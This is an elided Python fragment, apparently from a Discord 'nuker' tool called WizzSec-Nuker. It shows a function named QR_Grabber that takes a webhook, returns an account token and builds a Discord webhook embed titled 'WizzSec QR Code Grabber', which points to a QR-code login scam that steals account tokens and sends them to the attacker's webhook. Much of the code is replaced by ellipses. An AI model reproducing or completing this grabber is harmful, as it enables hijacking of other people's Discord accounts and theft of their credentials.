...
def QR_Grabber(Webhook):
    ...
    if sys.argv[0].endswith(".exe"):
        print(f'\nOpening a new WizzSecNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}')
        try:
    ...
    return token;
            ...
            embed = {
                ...
                "embeds": [
                    {
                        "author": {
                            "name": "WizzSec QR Code Grabber",
                            "url": "https://github.com/Rdimo/WizzSec-Nuker",
                            "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/WizzSec.gif"
                        },
                        ...
                        "footer": {
                          "text": "©Rdimo#6969 https://github.com/Rdimo/WizzSec-Nuker"
                        }
                    }
                ]
            }
